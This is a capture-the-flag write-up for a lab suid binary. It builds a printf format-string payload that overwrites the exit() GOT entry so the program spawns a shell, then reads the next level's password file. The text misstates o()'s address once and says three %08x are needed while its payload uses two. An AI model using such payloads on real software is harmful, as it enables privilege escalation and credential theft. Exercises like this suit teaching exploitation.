# Level5

## Context & Explanation
 * There is one file in our home, ```level5```, belonging to ```level6``` user, with suid.
 * Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

 * We run the program with gdb and we observe that:
 	* `main()` only calls `n()`
	* `n()` makes use of `fgets()` with an on stack array of size `0x200`
	* It then calls printf with our input as the format string
	* And after printf the function calls `exit(1)`
```dump
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
 80483d6:	68 28 00 00 00       	push   0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
```
	* Finally there's the `o()` function at address `0x080484a4` which is never called, but it possess a call to `system("/bin/sh")` and it will allow us to get the flag.

 * We have the appropriate setup for a [Format-String attack](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf), because printf makes use of a buffer user filled:
    * In `exit()` want to modify the value behind `ds:0x8049838`, which is used for the first jump, so it equals the adress of `o()` : `0x804988c`.
	* On the stack there is 3 argument we need to pass before we can read our own format string, so we will need 3 %x.
	* So our format should look this way:
		* [1st jump address][%08x]*3[filler text to write in total `0x804988c` octets][%n]
		* Like for the previous exercise, we can use width modifier to simplfy the writting.
	* result: [\x38\x98\x04\x08][%08x%08x%0134513808x][%n]

## Resolution

	1. We generate our future format string using this command:
```sh
python -c "print(
'\x38' + '\x98' + '\x04' + '\x08' +
'%08x' + '%08x' +
'%0' + str(134513808) + 'x' +
'%n')" > /var/crash/injection_lvl5
```
	2. We launch `level5` by making use of cat with our custom file, with `-` as a second argument, so once the file has been read, cat will transmit stdin :
```sh
cat /var/crash/injection_lvl5 - | ./level5
```
	3. Inside the newly opened shell session we now only have to execute these commands:
```sh
cd ..
cd level6
cat .pass
```
